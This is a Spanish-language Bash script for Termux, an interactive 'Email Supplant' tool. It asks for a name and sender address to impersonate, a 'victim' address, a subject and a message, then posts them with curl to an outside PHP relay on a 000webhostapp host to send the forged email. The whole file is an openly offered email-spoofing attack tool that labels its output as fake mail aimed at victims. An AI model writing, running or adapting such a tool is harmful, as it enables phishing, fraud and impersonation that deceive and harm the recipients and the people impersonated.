#!/bin/bash
#
# Created by: Informatic_in_Termux
#
# VARIABLES
#
PWD=$(pwd)
source ${PWD}/Colors.sh
#
# FUNCIONES
#
function Email_Supplant {
	sleep 0.5
	clear
echo -e "${verde}
▗▄▄▄▖            █  ▗▄▖        ▗▄▖                ▗▄▖
▐▛▀▀▘            ▀  ▝▜▌       ▗▛▀▜                ▝▜▌             ▐▌
▐▌   ▐█▙█▖ ▟██▖ ██   ▐▌       ▐▙   ▐▌ ▐▌▐▙█▙ ▐▙█▙  ▐▌   ▟██▖▐▙██▖▐███
▐███ ▐▌█▐▌ ▘▄▟▌  █   ▐▌        ▜█▙ ▐▌ ▐▌▐▛ ▜▌▐▛ ▜▌ ▐▌   ▘▄▟▌▐▛ ▐▌ ▐▌
▐▌   ▐▌█▐▌▗█▀▜▌  █   ▐▌   ██▌    ▜▌▐▌ ▐▌▐▌ ▐▌▐▌ ▐▌ ▐▌  ▗█▀▜▌▐▌ ▐▌ ▐▌
▐▙▄▄▖▐▌█▐▌▐▙▄█▌▗▄█▄▖ ▐▙▄      ▐▄▄▟▘▐▙▄█▌▐█▄█▘▐█▄█▘ ▐▙▄ ▐▙▄█▌▐▌ ▐▌ ▐▙▄
▝▀▀▀▘▝▘▀▝▘ ▀▀▝▘▝▀▀▀▘  ▀▀       ▀▀▘  ▀▀▝▘▐▌▀▘ ▐▌▀▘   ▀▀  ▀▀▝▘▝▘ ▝▘  ▀▀
                                        ▐▌   ▐▌
"${blanco}
}
function Nombre_Suplantar {
echo -e -n "${verde}
┌═══════════════════════════════┐
█ ${blanco}INGRESE EL NOMBRE A SUPLANTAR ${verde}█
└═══════════════════════════════┘
┃
└═>>> "${blanco}
read -r NOMBRE
sleep 0.5
}
function Correo_Suplantar {
echo -e -n "${verde}
┌═══════════════════════════════┐
█ ${blanco}INGRESE EL CORREO A SUPLANTAR ${verde}█
└═══════════════════════════════┘
┃
└═>>> "${blanco}
read -r REMITENTE
sleep 0.5
}
function Correo_Objetivo {
echo -e -n "${verde}
┌═════════════════════════════════┐
█ ${blanco}INGRESE EL CORREO DE LA VÍCTIMA ${verde}█
└═════════════════════════════════┘
┃
└═>>> "${blanco}
read -r DESTINATARIO
sleep 0.5
}
function Asunto {
echo -e -n "${verde}
┌══════════════════════════════┐
█ ${blanco}INGRESE EL ASUNTO DEL CORREO ${verde}█
└══════════════════════════════┘
┃
└═>>> "${blanco}
read -r ASUNTO
sleep 0.5
}
function Mensaje {
echo -e -n "${verde}
┌═════════════════════════════┐
█ ${blanco}INGRESE EL MENSAJE A ENVIAR ${verde}█
└═════════════════════════════┘
┃
└═>>> "${blanco}
read -r MENSAJE
sleep 0.5
}
function Enviar_Correo {
echo -e -n "${verde}
┌══════════════════════════┐
█ ${blanco}ENVIANDO CORREO FALSO... ${verde}█
└══════════════════════════┘
"${blanco}
curl --data "nombre=$NOMBRE && remitente=$REMITENTE && destinatario=$DESTINATARIO && asunto=$ASUNTO && mensaje=$MENSAJE" https://shelterless-catches.000webhostapp.com/enviarMail.php
}
function Nuevo_Correo {
Email_Supplant
echo -e -n "${verde}
┌════════════════════════════════════┐
█ ${blanco}CORREO FALSO ENVIADO CORRECTAMENTE ${verde}█
└════════════════════════════════════┘

┌══════════════════════════════════┐
█ ${blanco}¿DESEA ENVIAR OTRO CORREO FALSO? ${verde}█
└══════════════════════════════════┘
┃    ┌════════════════════════════════════┐
└═>>>█ [${blanco}01${verde}] ┃ ${blanco}SI ENVIAR OTRO CORREO FALSO ${verde}█
┃    └════════════════════════════════════┘
┃    ┌════════════════════════════════════┐
└═>>>█ [${blanco}02${verde}] ┃ ${blanco}NO ENVIAR OTRO CORREO FALSO ${verde}█
┃    └════════════════════════════════════┘
┃
└═>>> "${blanco}
read -r NUEVO

if [[ $NUEVO == 1 || $NUEVO == 01 ]];then
source ${PWD}/Email-Supplant.sh
elif [[ $NUEVO == 2 || $NUEVO == 02 ]];then
exit
else
echo -e "${rojo}
┌═════════════════════┐
█ ${blanco}¡OPCIÓN INCORRECTA! ${rojo}█
└═════════════════════┘
"${blanco}
sleep 0.5
Nuevo_Correo
fi
}
function Editar_Datos {
Email_Supplant
echo -e -n "${verde}
┌══════════════════════════┐
█ ${blanco}¿QUÉ DATOS DESEA EDITAR? ${verde}█
└══════════════════════════┘
┃    ┌══════════════════════════════════┐
└═>>>█ [${blanco}01${verde}] ┃ ${blanco}EDITAR NOMBRE A SUPLANTAR ${verde}█
┃    └══════════════════════════════════┘
┃    ┌══════════════════════════════════┐
└═>>>█ [${blanco}02${verde}] ┃ ${blanco}EDITAR CORREO A SUPLANTAR ${verde}█
┃    └══════════════════════════════════┘
┃    ┌════════════════════════════════════┐
└═>>>█ [${blanco}03${verde}] ┃ ${blanco}EDITAR CORREO DE LA VÍCTIMA ${verde}█
┃    └════════════════════════════════════┘
┃    ┌═════════════════════════════════┐
└═>>>█ [${blanco}04${verde}] ┃ ${blanco}EDITAR ASUNTO DEL CORREO ${verde}█
┃    └═════════════════════════════════┘
┃    ┌════════════════════════════════┐
└═>>>█ [${blanco}05${verde}] ┃ ${blanco}EDITAR MENSAJE A ENVIAR ${verde}█
┃    └════════════════════════════════┘
┃    ┌═══════════════┐
└═>>>█ [${blanco}00${verde}] ┃ ${rojo}ENVIAR ${verde}█
┃    └═══════════════┘
┃
└═>>> "${blanco}
read -r EDITAR
if [[ $EDITAR == 0 || $EDITAR == 00 ]];then
Enviar_Correo
Nuevo_Correo
elif [[ $EDITAR == 1 || $EDITAR == 01 ]];then
Nombre_Suplantar
Editar_Datos
elif [[ $EDITAR == 2 || $EDITAR == 02 ]];then
Correo_Suplantar
Editar_Datos
elif [[ $EDITAR == 3 || $EDITAR == 03 ]];then
Correo_Objetivo
Editar_Datos
elif [[ $EDITAR == 4 || $EDITAR == 04 ]];then
Asunto
Editar_Datos
elif [[ $EDITAR == 5 || $EDITAR == 05 ]];then
Mensaje
Editar_Datos
else
echo -e "${rojo}
┌═════════════════════┐
█ ${blanco}¡OPCIÓN INCORRECTA! ${rojo}█
└═════════════════════┘
"${blanco}
sleep 0.5
Editar_Datos
fi
}
function Enviar_Editar {
echo -e -n "${verde}
┌════════════════════════════════┐
█ ${blanco}¿DESEA ENVIAR EL CORREO FALSO? ${verde}█
└════════════════════════════════┘
┃    ┌═══════════════┐
└═>>>█ [${blanco}01${verde}] ┃ ${blanco}ENVIAR ${verde}█
┃    └═══════════════┘
┃    ┌═══════════════┐
└═>>>█ [${blanco}02${verde}] ┃ ${blanco}EDITAR ${verde}█
┃    └═══════════════┘
┃
└═>>> "${blanco}
read -r ENVIAR_EDITAR

if [[ $ENVIAR_EDITAR == 1 || $ENVIAR_EDITAR == 01 ]];then
Enviar_Correo
Nuevo_Correo
elif [[ $ENVIAR_EDITAR == 2 || $ENVIAR_EDITAR == 02 ]];then
Editar_Datos
fi
}
#
# CÓDIGO
#
Email_Supplant
Nombre_Suplantar
Correo_Suplantar
Correo_Objetivo
Asunto
Mensaje
Enviar_Editar
